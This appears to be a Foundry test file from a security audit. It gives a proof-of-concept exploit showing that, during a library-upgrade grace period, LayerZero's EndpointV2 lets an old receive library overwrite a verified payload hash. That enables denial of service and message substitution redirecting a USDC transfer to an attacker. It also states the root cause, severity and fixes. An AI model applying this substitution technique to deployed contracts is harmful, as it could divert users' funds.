// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import { Test } from "forge-std/Test.sol";
import { console2 } from "forge-std/console2.sol";

import { EndpointV2 } from "../contracts/EndpointV2.sol";
import { Origin } from "../contracts/interfaces/ILayerZeroEndpointV2.sol";
import { ILayerZeroReceiver } from "../contracts/interfaces/ILayerZeroReceiver.sol";
import { IMessageLib, MessageLibType } from "../contracts/interfaces/IMessageLib.sol";
import { SetConfigParam } from "../contracts/interfaces/IMessageLibManager.sol";
import { Errors } from "../contracts/libs/Errors.sol";
import { AddressCast } from "../contracts/libs/AddressCast.sol";
import { GUID } from "../contracts/libs/GUID.sol";

/**
 * @title Exploit_GracePeriodOverwrite
 * @notice Demonstrates grace-period cross-library payload hash overwrite
 * @dev This is NOT "malicious admin" - it's a legitimate upgrade scenario
 *
 * SCENARIO:
 * - OApp upgrades from LibOld to LibNew with grace period
 * - Both libraries are intentionally valid (safe upgrade)
 * - LibNew verifies message with payloadHash_A
 * - LibOld (still valid during grace) reverifies with payloadHash_B
 * - Result: Executor delivering payload_A now FAILS (DoS)
 *
 * IMPACT:
 * - Breaks "once verified, immutable" property
 * - Causes deterministic DoS for honest executors
 * - Enables message substitution within same nonce
 */
contract Exploit_GracePeriodOverwrite is Test {
    using AddressCast for address;

    EndpointV2 public endpoint;
    MockReceiveLib public libNew;
    MockReceiveLib public libOld;
    MockOApp public oapp;

    address public executor;
    address public attacker;

    uint32 public constant LOCAL_EID = 1;
    uint32 public constant REMOTE_EID = 2;

    bytes32 public senderB32;

    function setUp() public {
        executor = makeAddr("executor");
        attacker = makeAddr("attacker");
        senderB32 = makeAddr("remoteSender").toBytes32();

        // Deploy endpoint
        endpoint = new EndpointV2(LOCAL_EID, address(this));

        // Deploy two legitimate libraries (not malicious!)
        libOld = new MockReceiveLib(address(endpoint), LOCAL_EID);
        libNew = new MockReceiveLib(address(endpoint), LOCAL_EID);

        // Register both as legitimate libraries
        endpoint.registerLibrary(address(libOld));
        endpoint.registerLibrary(address(libNew));

        // Deploy OApp
        oapp = new MockOApp(address(endpoint));

        vm.label(address(endpoint), "Endpoint");
        vm.label(address(libOld), "LibOld");
        vm.label(address(libNew), "LibNew");
        vm.label(address(oapp), "OApp");
        vm.label(executor, "Executor");
    }

    /**
     * @notice FINDING: Grace-period reverify allows payload hash overwrite
     * @dev This breaks the invariant: "once verified, payload is immutable"
     *
     * CRITICAL: This does NOT assume "malicious admin"
     * - OApp legitimately upgrades LibOld â†’ LibNew
     * - Sets grace period for safe transition
     * - BOTH libs are intentional and trusted
     * - But LibOld can sabotage LibNew's verification
     */
    function test_FINDING_GracePeriodPayloadOverwrite() public {
        console2.log("\nâ•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—");
        console2.log("â•‘  FINDING: Grace Period Cross-Library Payload Overwrite   â•‘");
        console2.log("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•\n");

        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PHASE 1: Setup - OApp upgrades with grace period
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

        console2.log("PHASE 1: OApp Upgrade with Grace Period");
        console2.log("â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");

        // Initially using LibOld
        vm.prank(address(oapp));
        endpoint.setReceiveLibrary(address(oapp), REMOTE_EID, address(libOld), 0);
        console2.log("âœ“ Initial library: LibOld");

        // Upgrade to LibNew with 1000-block grace period
        // This is LEGITIMATE behavior for safe upgrades
        vm.prank(address(oapp));
        endpoint.setReceiveLibrary(address(oapp), REMOTE_EID, address(libNew), 1000);
        console2.log("âœ“ Upgraded to: LibNew (grace period = 1000 blocks)");

        // Verify both libraries are valid (this is BY DESIGN for safe transition)
        bool libNewValid = endpoint.isValidReceiveLibrary(address(oapp), REMOTE_EID, address(libNew));
        bool libOldValid = endpoint.isValidReceiveLibrary(address(oapp), REMOTE_EID, address(libOld));

        console2.log("\nLibrary Validity (during grace period):");
        console2.log("  LibNew valid:", libNewValid);
        console2.log("  LibOld valid:", libOldValid);
        require(libNewValid && libOldValid, "Both libs should be valid during grace");

        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PHASE 2: LibNew verifies message with payload A
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

        console2.log("\n\nPHASE 2: LibNew Verifies Message");
        console2.log("â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");

        Origin memory origin = Origin({
            srcEid: REMOTE_EID,
            sender: senderB32,
            nonce: 1
        });

        bytes32 guid = GUID.generate(1, REMOTE_EID, address(uint160(uint256(senderB32))), LOCAL_EID, address(oapp).toBytes32());

        bytes memory messageA = "Transfer 100 USDC to Alice";
        bytes memory payloadA = abi.encodePacked(guid, messageA);
        bytes32 payloadHashA = keccak256(payloadA);

        console2.log("Message A:", string(messageA));
        console2.log("Payload Hash A:");
        console2.logBytes32(payloadHashA);

        // LibNew verifies with payloadHashA
        vm.prank(address(libNew));
        endpoint.verify(origin, address(oapp), payloadHashA);
        console2.log("\nâœ“ LibNew verified message (hash A stored)");

        // Check stored hash
        bytes32 storedHash = endpoint.inboundPayloadHash(address(oapp), REMOTE_EID, senderB32, 1);
        console2.log("\nStored hash after LibNew verify:");
        console2.logBytes32(storedHash);
        assertEq(storedHash, payloadHashA, "Hash A should be stored");

        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PHASE 3: LibOld reverifies with DIFFERENT payload B
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

        console2.log("\n\nPHASE 3: LibOld Reverifies with Different Payload");
        console2.log("â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");

        bytes memory messageB = "Transfer 100 USDC to Attacker";  // Different message!
        bytes memory payloadB = abi.encodePacked(guid, messageB);
        bytes32 payloadHashB = keccak256(payloadB);

        console2.log("Message B:", string(messageB));
        console2.log("Payload Hash B:");
        console2.logBytes32(payloadHashB);
        require(payloadHashA != payloadHashB, "Hashes must be different");

        // Check if reverify is allowed
        bool canReverify = endpoint.verifiable(origin, address(oapp));
        console2.log("\nCan LibOld reverify? (nonce <= lazyNonce, hash != EMPTY):", canReverify);
        require(canReverify, "Reverify should be allowed");

        // LibOld calls verify with payloadHashB
        console2.log("\nâ†’ LibOld calling verify(payloadHashB)...");
        vm.prank(address(libOld));
        endpoint.verify(origin, address(oapp), payloadHashB);
        console2.log("âœ“ LibOld reverify succeeded");

        // Check stored hash AFTER reverify
        storedHash = endpoint.inboundPayloadHash(address(oapp), REMOTE_EID, senderB32, 1);
        console2.log("\nStored hash AFTER LibOld reverify:");
        console2.logBytes32(storedHash);
        console2.log("Original hash A:");
        console2.logBytes32(payloadHashA);
        console2.log("New hash B:");
        console2.logBytes32(payloadHashB);

        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // CRITICAL FINDING: Hash was overwritten!
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

        if (storedHash == payloadHashB) {
            console2.log("\n");
            console2.log("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—");
            console2.log("â•‘               ğŸš¨ VULNERABILITY CONFIRMED ğŸš¨               â•‘");
            console2.log("â•‘                                                           â•‘");
            console2.log("â•‘  Stored hash was OVERWRITTEN from A to B                 â•‘");
            console2.log("â•‘  This breaks: 'once verified, immutable' invariant       â•‘");
            console2.log("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
            console2.log("");
        }

        assertEq(storedHash, payloadHashB, "FINDING: Hash was overwritten!");

        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PHASE 4: Demonstrate IMPACT - Executor delivery fails
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

        console2.log("\n\nPHASE 4: Impact Demonstration");
        console2.log("â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");

        console2.log("\nScenario: Honest executor observed LibNew's verification");
        console2.log("          They prepared to deliver payload A");
        console2.log("          But stored hash was changed to B by LibOld");

        // Executor tries to deliver payload A (the one they saw verified)
        console2.log("\nâ†’ Executor attempting to deliver payload A...");

        vm.prank(executor);
        try endpoint.lzReceive(origin, address(oapp), guid, messageA, "") {
            console2.log("âœ— Delivery succeeded (unexpected)");
            revert("Should have failed - hash mismatch");
        } catch Error(string memory reason) {
            console2.log("âœ“ Delivery FAILED:", reason);
        } catch (bytes memory lowLevelData) {
            // Decode LZ_PayloadHashNotFound
            if (lowLevelData.length >= 4) {
                bytes4 selector = bytes4(lowLevelData);
                console2.log("âœ“ Delivery FAILED with selector:");
                console2.logBytes4(selector);

                // Decode full error if it's PayloadHashNotFound
                if (selector == Errors.LZ_PayloadHashNotFound.selector) {
                    // Error format: LZ_PayloadHashNotFound(bytes32 expected, bytes32 actual)
                    (bytes32 expected, bytes32 actual) = abi.decode(
                        _slice(lowLevelData, 4, lowLevelData.length),
                        (bytes32, bytes32)
                    );
                    console2.log("\n  Expected hash (now B):");
                    console2.logBytes32(expected);
                    console2.log("  Actual hash (payload A):");
                    console2.logBytes32(actual);

                    assertEq(expected, payloadHashB, "Expected should be B");
                    assertEq(actual, payloadHashA, "Actual should be A");
                }
            }
        }

        console2.log("\n");
        console2.log("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—");
        console2.log("â•‘                    IMPACT CONFIRMED                       â•‘");
        console2.log("â•‘                                                           â•‘");
        console2.log("â•‘  âœ— Honest executor delivery FAILS (hash mismatch)        â•‘");
        console2.log("â•‘  âœ— Message is stuck/DoS'd                                â•‘");
        console2.log("â•‘  âœ— Executor must retry with payload B                    â•‘");
        console2.log("â•‘     (which they didn't see verified by LibNew)           â•‘");
        console2.log("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
        console2.log("");

        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // PHASE 5: Show payload B CAN be delivered
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

        console2.log("\n\nPHASE 5: Message Substitution");
        console2.log("â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€");

        console2.log("\nâ†’ Attacker (or coerced executor) delivering payload B...");

        vm.prank(executor);
        endpoint.lzReceive(origin, address(oapp), guid, messageB, "");

        console2.log("âœ“ Payload B delivered successfully");
        console2.log("\nOApp received message:", string(oapp.lastMessage()));
        assertEq(oapp.lastMessage(), messageB, "Wrong message delivered");

        console2.log("\n");
        console2.log("â•”â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•—");
        console2.log("â•‘           MESSAGE SUBSTITUTION CONFIRMED                  â•‘");
        console2.log("â•‘                                                           â•‘");
        console2.log("â•‘  Original verified: 'Transfer 100 USDC to Alice'         â•‘");
        console2.log("â•‘  Actually executed: 'Transfer 100 USDC to Attacker'      â•‘");
        console2.log("â•šâ•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
        console2.log("");

        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
        // SUMMARY
        // â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

        console2.log("\n");
        console2.log("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
        console2.log("                      FINDING SUMMARY                       ");
        console2.log("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
        console2.log("");
        console2.log("VULNERABILITY: Grace-period cross-library payload overwrite");
        console2.log("");
        console2.log("ROOT CAUSE:");
        console2.log("  MessagingChannel._inbound() line 44:");
        console2.log("    inboundPayloadHash[...][nonce] = _payloadHash;");
        console2.log("  â†’ No check prevents overwriting existing hash");
        console2.log("");
        console2.log("CONDITION:");
        console2.log("  - OApp upgrades receive library with grace period");
        console2.log("  - Both old and new libraries are valid (BY DESIGN)");
        console2.log("  - Old library can reverify same nonce with different hash");
        console2.log("");
        console2.log("IMPACT:");
        console2.log("  1. Breaks 'once verified, immutable' invariant");
        console2.log("  2. Honest executor delivery FAILS (DoS)");
        console2.log("  3. Enables message substitution within same nonce");
        console2.log("");
        console2.log("SEVERITY: MEDIUM");
        console2.log("  - Not exploitable by external attacker");
        console2.log("  - Requires grace period (legitimate upgrade scenario)");
        console2.log("  - But: old library can sabotage new library's work");
        console2.log("  - Impact: DoS + potential message substitution");
        console2.log("");
        console2.log("FIX:");
        console2.log("  Option 1 - Prevent reverify:");
        console2.log("    if (existing != EMPTY) revert AlreadyVerified();");
        console2.log("");
        console2.log("  Option 2 - Idempotent verify:");
        console2.log("    if (existing != EMPTY && existing != _payloadHash)");
        console2.log("      revert HashMismatch();");
        console2.log("");
        console2.log("â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•");
    }

    // Helper function to slice bytes
    function _slice(bytes memory data, uint256 start, uint256 end) internal pure returns (bytes memory) {
        bytes memory result = new bytes(end - start);
        for (uint256 i = start; i < end; i++) {
            result[i - start] = data[i];
        }
        return result;
    }
}

// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•
// MOCK CONTRACTS
// â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•

contract MockOApp is ILayerZeroReceiver {
    address public endpoint;
    bytes public lastMessage;

    constructor(address _endpoint) {
        endpoint = _endpoint;
    }

    function allowInitializePath(Origin calldata) external pure returns (bool) {
        return true;
    }

    function lzReceive(
        Origin calldata,
        bytes32,
        bytes calldata _message,
        address,
        bytes calldata
    ) external payable {
        require(msg.sender == endpoint, "only endpoint");
        lastMessage = _message;
    }
}

contract MockReceiveLib is IMessageLib {
    address public endpoint;
    uint32 public localEid;

    constructor(address _endpoint, uint32 _localEid) {
        endpoint = _endpoint;
        localEid = _localEid;
    }

    function supportsInterface(bytes4 interfaceId) external pure returns (bool) {
        return interfaceId == type(IMessageLib).interfaceId;
    }

    function setConfig(address, SetConfigParam[] calldata) external {}

    function getConfig(uint32, address, uint32) external pure returns (bytes memory) {
        return "";
    }

    function isSupportedEid(uint32) external pure returns (bool) {
        return true;
    }

    function messageLibType() external pure returns (MessageLibType) {
        return MessageLibType.Receive;
    }

    function version() external pure returns (uint64 major, uint8 minor, uint8 endpointVersion) {
        return (1, 0, 2);
    }
}
